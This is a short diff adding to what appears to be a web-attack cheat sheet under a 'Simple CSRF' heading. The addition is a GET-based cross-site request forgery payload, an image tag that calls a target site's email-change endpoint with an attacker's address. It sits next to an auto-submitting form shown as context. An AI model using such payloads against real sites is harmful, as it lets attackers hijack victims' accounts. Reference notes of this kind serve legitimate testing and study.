@@ -66,3 +66,7 @@ Simple CSRF:
 </form>
 <script> document.forms[0].submit(); </script>
 ```
+or if GET request is sufficient:
+```html
+<img src="https://$TARGET_WEB/email/change?email=$ATTACKER_EMAIL">
+```
